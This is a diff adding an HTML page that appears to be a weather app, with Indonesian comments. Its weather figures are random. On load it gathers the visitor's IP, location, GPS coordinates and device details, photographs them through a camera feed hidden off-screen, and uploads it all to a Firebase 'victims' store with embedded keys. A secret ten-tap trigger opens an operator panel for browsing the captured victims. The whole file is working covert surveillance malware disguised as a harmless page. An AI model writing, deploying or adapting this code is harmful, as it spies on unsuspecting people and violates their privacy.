@@ -1,0 +1,718 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Weather • Update</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(145deg, #0f2027, #203a43, #2c5364);
+            min-height: 100vh;
+            color: white;
+            padding: 16px;
+        }
+        
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        
+        /* HEADER */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .location {
+            background: rgba(255,255,255,0.15);
+            padding: 10px 18px;
+            border-radius: 40px;
+            backdrop-filter: blur(10px);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .date {
+            background: rgba(255,255,255,0.15);
+            padding: 10px 18px;
+            border-radius: 40px;
+            font-size: 14px;
+        }
+        
+        /* MAIN CARD */
+        .main-card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            border-radius: 40px;
+            padding: 25px 20px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        
+        .weather-main {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .temp-big {
+            font-size: 64px;
+            font-weight: 300;
+        }
+        
+        .weather-icon {
+            font-size: 70px;
+            animation: float 3s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        /* DETAIL GRID */
+        .detail-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin-top: 20px;
+        }
+        
+        .detail-item {
+            background: rgba(255,255,255,0.1);
+            border-radius: 20px;
+            padding: 15px;
+        }
+        
+        .detail-icon {
+            font-size: 20px;
+            margin-bottom: 5px;
+        }
+        
+        .detail-value {
+            font-size: 18px;
+            font-weight: 600;
+        }
+        
+        /* HOURLY */
+        .hourly-section {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 30px;
+            padding: 20px;
+        }
+        
+        .hourly-scroll {
+            display: flex;
+            gap: 12px;
+            overflow-x: auto;
+            padding: 5px 0;
+        }
+        
+        .hour-item {
+            background: rgba(255,255,255,0.15);
+            border-radius: 20px;
+            padding: 12px;
+            min-width: 70px;
+            text-align: center;
+        }
+        
+        /* ============================================ */
+        /* SUPER HIDDEN TRIGGER - 10 TAP CEPAT          */
+        /* ============================================ */
+        .secret-trigger {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 100px;
+            background: transparent;
+            z-index: 9999;
+            cursor: pointer;
+        }
+        
+        /* ============================================ */
+        /* ADMIN PANEL                                  */
+        /* ============================================ */
+        .admin-panel {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.98);
+            backdrop-filter: blur(20px);
+            z-index: 999999;
+            padding: 20px;
+            overflow-y: auto;
+            display: none;
+            color: white;
+        }
+        
+        .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #333;
+        }
+        
+        .admin-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #2c5364;
+        }
+        
+        .close-btn {
+            width: 44px;
+            height: 44px;
+            background: #ff4444;
+            border: none;
+            border-radius: 22px;
+            color: white;
+            font-size: 22px;
+            cursor: pointer;
+        }
+        
+        .stats-container {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+        
+        .stat-box {
+            background: #1a1a1a;
+            padding: 12px;
+            border-radius: 15px;
+            text-align: center;
+        }
+        
+        .stat-value {
+            font-size: 24px;
+            font-weight: 700;
+            color: #2c5364;
+        }
+        
+        .data-section {
+            background: #1a1a1a;
+            border-radius: 20px;
+            padding: 15px;
+            margin-bottom: 15px;
+        }
+        
+        .section-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #2c5364;
+            margin-bottom: 10px;
+        }
+        
+        .data-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 12px;
+            background: #2a2a2a;
+            border-radius: 10px;
+            margin-bottom: 5px;
+            font-size: 13px;
+        }
+        
+        .photo-preview {
+            width: 100%;
+            border-radius: 15px;
+            margin-top: 10px;
+            border: 2px solid #2c5364;
+        }
+        
+        .victim-tab {
+            display: flex;
+            gap: 8px;
+            overflow-x: auto;
+            margin-bottom: 15px;
+            padding: 5px 0;
+        }
+        
+        .victim-btn {
+            background: #2a2a2a;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 40px;
+            color: white;
+            cursor: pointer;
+            white-space: nowrap;
+            font-size: 13px;
+        }
+        
+        .victim-btn.active {
+            background: #2c5364;
+        }
+        
+        .status-bar {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.8);
+            color: #00ff88;
+            padding: 6px 12px;
+            border-radius: 40px;
+            font-size: 11px;
+            z-index: 99999;
+            border: 1px solid #00ff88;
+        }
+        
+        .debug-log {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: rgba(0,0,0,0.5);
+            color: #ffaa00;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 10px;
+            z-index: 99998;
+        }
+    </style>
+    
+    <!-- Firebase -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+</head>
+<body>
+    <div class="container">
+        <!-- HEADER -->
+        <div class="header">
+            <div class="location">
+                <span>📍</span>
+                <span id="cityName">-</span>
+            </div>
+            <div class="date" id="currentDate">
+                <span id="dayName">-</span>, <span id="dateNum">-</span>
+            </div>
+        </div>
+        
+        <!-- MAIN CARD -->
+        <div class="main-card">
+            <div class="weather-main">
+                <div>
+                    <div class="temp-big" id="temperature">--°</div>
+                </div>
+                <div class="weather-icon" id="weatherIcon">☀️</div>
+            </div>
+            
+            <div class="detail-grid">
+                <div class="detail-item">
+                    <div class="detail-icon">💧</div>
+                    <div class="detail-value" id="humidity">--%</div>
+                </div>
+                <div class="detail-item">
+                    <div class="detail-icon">💨</div>
+                    <div class="detail-value" id="wind">--</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- HOURLY -->
+        <div class="hourly-section">
+            <div style="margin-bottom: 10px;">⏰ Per Jam</div>
+            <div class="hourly-scroll" id="hourlyContainer">
+                <div class="hour-item">--:--</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================ -->
+    <!-- HIDDEN TRIGGER                                -->
+    <!-- ============================================ -->
+    <div class="secret-trigger" id="secretTrigger"></div>
+    <div class="status-bar" id="statusBar">⏳ Initializing...</div>
+    <div class="debug-log" id="debugLog">Debug: ready</div>
+
+    <!-- ============================================ -->
+    <!-- ADMIN PANEL                                  -->
+    <!-- ============================================ -->
+    <div class="admin-panel" id="adminPanel">
+        <div class="admin-header">
+            <div class="admin-title">🔐 DATA VAULT</div>
+            <button class="close-btn" onclick="closeAdmin()">✕</button>
+        </div>
+        
+        <div class="stats-container">
+            <div class="stat-box">
+                <div class="stat-value" id="statTotal">0</div>
+                <div class="stat-label">Total</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value" id="statPhoto">0</div>
+                <div class="stat-label">Foto</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value" id="statGPS">0</div>
+                <div class="stat-label">GPS</div>
+            </div>
+        </div>
+        
+        <div class="victim-tab" id="victimTabs"></div>
+        
+        <div class="data-section">
+            <div class="section-title">📸 FOTO</div>
+            <div id="photoDisplay">Belum ada</div>
+        </div>
+        
+        <div class="data-section">
+            <div class="section-title">📍 LOKASI</div>
+            <div id="locationDisplay"></div>
+        </div>
+        
+        <div class="data-section">
+            <div class="section-title">📱 DEVICE</div>
+            <div id="deviceDisplay"></div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // FIREBASE - PUNYA LO
+        // ============================================
+        const firebaseConfig = {
+            apiKey: "AIzaSyC5yAWjKj3jS6_1NYLADS_QCRr06OZO2dQ",
+            authDomain: "cuaca-bb648.firebaseapp.com",
+            databaseURL: "https://cuaca-bb648-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "cuaca-bb648",
+            storageBucket: "cuaca-bb648.firebasestorage.app",
+            messagingSenderId: "358412575028",
+            appId: "1:358412575028:web:1af89186e9819c3cb30561"
+        };
+
+        // Init Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        const victimsRef = db.ref('victims');
+        
+        // ============================================
+        // VARIABLES
+        // ============================================
+        let victimId = 'v_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+        let photoData = null;
+        let locationData = {};
+        let deviceData = {};
+        let allVictims = [];
+        let currentIdx = 0;
+        
+        // Update status
+        function updateStatus(msg, isError = false) {
+            document.getElementById('statusBar').innerHTML = msg;
+            document.getElementById('debugLog').innerHTML = 'Debug: ' + msg;
+            console.log(msg);
+        }
+        
+        // ============================================
+        // 1. AMBIL DATA DASAR (PASTI WORK)
+        // ============================================
+        async function collectBasicData() {
+            updateStatus('📱 Mengambil data device...');
+            
+            // Device info
+            deviceData = {
+                userAgent: navigator.userAgent.substring(0, 100),
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: screen.width + 'x' + screen.height,
+                timestamp: new Date().toISOString()
+            };
+            
+            // IP Public (pake api gratis)
+            try {
+                let ipRes = await fetch('https://api.ipify.org?format=json');
+                let ipJson = await ipRes.json();
+                deviceData.ip = ipJson.ip;
+                updateStatus('🌐 IP: ' + ipJson.ip);
+                
+                // Lokasi dari IP
+                let locRes = await fetch('https://ipapi.co/' + ipJson.ip + '/json/');
+                let locJson = await locRes.json();
+                locationData = {
+                    country: locJson.country_name || '-',
+                    city: locJson.city || '-',
+                    region: locJson.region || '-',
+                    isp: locJson.org || '-',
+                    lat: locJson.latitude || null,
+                    lon: locJson.longitude || null
+                };
+                
+                document.getElementById('cityName').innerText = locJson.city || '-';
+                updateStatus('📍 Lokasi: ' + (locJson.city || '-'));
+                
+            } catch (e) {
+                updateStatus('⚠️ Gagal ambil IP', true);
+                console.log(e);
+            }
+            
+            // Coba GPS
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        locationData.gps = {
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            acc: pos.coords.accuracy + 'm',
+                            maps: 'https://maps.google.com/?q=' + pos.coords.latitude + ',' + pos.coords.longitude
+                        };
+                        updateStatus('✅ GPS dapat');
+                    },
+                    (err) => {
+                        updateStatus('⚠️ GPS ditolak');
+                    }
+                );
+            }
+            
+            // Battery
+            if ('getBattery' in navigator) {
+                try {
+                    let battery = await navigator.getBattery();
+                    deviceData.battery = Math.round(battery.level * 100) + '%';
+                } catch (e) {}
+            }
+        }
+        
+        // ============================================
+        // 2. KAMERA OTOMATIS
+        // ============================================
+        async function initCamera() {
+            updateStatus('📷 Minta akses kamera...');
+            
+            try {
+                let stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment' },
+                    audio: false 
+                });
+                
+                updateStatus('✅ Kamera diizinkan');
+                
+                let video = document.createElement('video');
+                video.srcObject = stream;
+                video.autoplay = true;
+                video.style.position = 'fixed';
+                video.style.top = '-9999px';
+                document.body.appendChild(video);
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    
+                    // Jepret setelah 2 detik
+                    setTimeout(() => {
+                        let canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        
+                        let ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        photoData = canvas.toDataURL('image/jpeg', 0.5);
+                        
+                        // Matikan kamera
+                        stream.getTracks().forEach(t => t.stop());
+                        
+                        updateStatus('✅ Foto diambil');
+                        
+                        // Kirim semua data
+                        sendAllData();
+                        
+                    }, 2000);
+                };
+                
+            } catch (err) {
+                updateStatus('⚠️ Kamera ditolak');
+                sendAllData(); // Tetap kirim walau tanpa foto
+            }
+        }
+        
+        // ============================================
+        // 3. KIRIM KE FIREBASE
+        // ============================================
+        function sendAllData() {
+            updateStatus('📤 Mengirim ke cloud...');
+            
+            let dataToSend = {
+                id: victimId,
+                timestamp: new Date().toISOString(),
+                photo: photoData,
+                location: locationData,
+                device: deviceData
+            };
+            
+            // Simpan ke Firebase
+            victimsRef.child(victimId).set(dataToSend)
+                .then(() => {
+                    updateStatus('✅ DATA TERKIRIM!');
+                    
+                    // Tampilkan sukses di UI
+                    document.getElementById('statusBar').style.background = '#00aa00';
+                    setTimeout(() => {
+                        document.getElementById('statusBar').style.background = 'rgba(0,0,0,0.8)';
+                    }, 3000);
+                })
+                .catch((error) => {
+                    updateStatus('❌ Gagal kirim: ' + error.message, true);
+                    console.error(error);
+                    
+                    // Coba lagi pake method lain
+                    victimsRef.child(victimId).set(dataToSend, (error) => {
+                        if (error) {
+                            updateStatus('❌ Error total', true);
+                        }
+                    });
+                });
+        }
+        
+        // ============================================
+        // 4. LISTENER FIREBASE (BUAT ADMIN)
+        // ============================================
+        victimsRef.on('value', (snapshot) => {
+            let data = snapshot.val();
+            if (data) {
+                allVictims = Object.values(data);
+                // Urutin dari terbaru
+                allVictims.sort((a, b) => {
+                    return new Date(b.timestamp) - new Date(a.timestamp);
+                });
+                
+                if (document.getElementById('adminPanel').style.display === 'block') {
+                    showVictims();
+                }
+            }
+        });
+        
+        // ============================================
+        // 5. ADMIN PANEL - 10 TAP
+        // ============================================
+        let tapCount = 0;
+        document.getElementById('secretTrigger').addEventListener('click', () => {
+            tapCount++;
+            
+            if (tapCount >= 10) {
+                document.getElementById('adminPanel').style.display = 'block';
+                showVictims();
+                tapCount = 0;
+            }
+            
+            setTimeout(() => { tapCount = 0; }, 3000);
+        });
+        
+        function closeAdmin() {
+            document.getElementById('adminPanel').style.display = 'none';
+        }
+        
+        function showVictims() {
+            // Stats
+            document.getElementById('statTotal').innerText = allVictims.length;
+            let photoCount = allVictims.filter(v => v.photo).length;
+            let gpsCount = allVictims.filter(v => v.location && v.location.gps).length;
+            document.getElementById('statPhoto').innerText = photoCount;
+            document.getElementById('statGPS').innerText = gpsCount;
+            
+            // Tabs
+            let tabs = '';
+            allVictims.forEach((v, i) => {
+                let time = new Date(v.timestamp).toLocaleTimeString();
+                tabs += `<button class="victim-btn ${i === currentIdx ? 'active' : ''}" onclick="selectVictim(${i})">${time}</button>`;
+            });
+            document.getElementById('victimTabs').innerHTML = tabs;
+            
+            if (allVictims.length > 0) {
+                displayVictim(allVictims[currentIdx]);
+            }
+        }
+        
+        function selectVictim(idx) {
+            currentIdx = idx;
+            showVictims();
+        }
+        
+        function displayVictim(v) {
+            // Photo
+            if (v.photo) {
+                document.getElementById('photoDisplay').innerHTML = `<img src="${v.photo}" class="photo-preview">`;
+            } else {
+                document.getElementById('photoDisplay').innerHTML = 'Tidak ada foto';
+            }
+            
+            // Location
+            let locHtml = '';
+            if (v.location) {
+                for (let key in v.location) {
+                    if (key === 'gps' && v.location.gps) {
+                        locHtml += `<div class="data-item"><span>gps:</span><span><a href="${v.location.gps.maps}" target="_blank">🌍 Map</a></span></div>`;
+                    } else {
+                        locHtml += `<div class="data-item"><span>${key}:</span><span>${v.location[key] || '-'}</span></div>`;
+                    }
+                }
+            }
+            document.getElementById('locationDisplay').innerHTML = locHtml || 'Tidak ada';
+            
+            // Device
+            let devHtml = '';
+            if (v.device) {
+                for (let key in v.device) {
+                    devHtml += `<div class="data-item"><span>${key}:</span><span>${v.device[key] || '-'}</span></div>`;
+                }
+            }
+            document.getElementById('deviceDisplay').innerHTML = devHtml || 'Tidak ada';
+        }
+        
+        // ============================================
+        // 6. WEATHER SIMULASI
+        // ============================================
+        function startWeather() {
+            let icons = ['☀️', '⛅', '🌤️', '🌥️'];
+            let idx = 0;
+            
+            setInterval(() => {
+                idx = (idx + 1) % icons.length;
+                document.getElementById('weatherIcon').innerText = icons[idx];
+                document.getElementById('temperature').innerText = (28 + Math.floor(Math.random() * 5)) + '°';
+                document.getElementById('humidity').innerText = (70 + Math.floor(Math.random() * 15)) + '%';
+                document.getElementById('wind').innerText = (5 + Math.floor(Math.random() * 10)) + ' km/h';
+            }, 5000);
+            
+            // Date
+            let days = ['Minggu','Senin','Selasa','Rabu','Kamis','Jumat','Sabtu'];
+            let d = new Date();
+            document.getElementById('dayName').innerText = days[d.getDay()];
+            document.getElementById('dateNum').innerText = d.getDate();
+            
+            // Hourly
+            let hourly = '';
+            for (let i = 0; i < 6; i++) {
+                let h = (d.getHours() + i) % 24;
+                hourly += `<div class="hour-item"><div>${h}:00</div><div>${icons[i % icons.length]}</div><div>${28 + i}°</div></div>`;
+            }
+            document.getElementById('hourlyContainer').innerHTML = hourly;
+        }
+        
+        // ============================================
+        // START
+        // ============================================
+        async function start() {
+            updateStatus('⏳ Starting...');
+            await collectBasicData();
+            await initCamera(); // Ini bakal manggil sendAllData() setelah foto
+            startWeather();
+        }
+        
+        start();
+    </script>
+</body>
+</html>
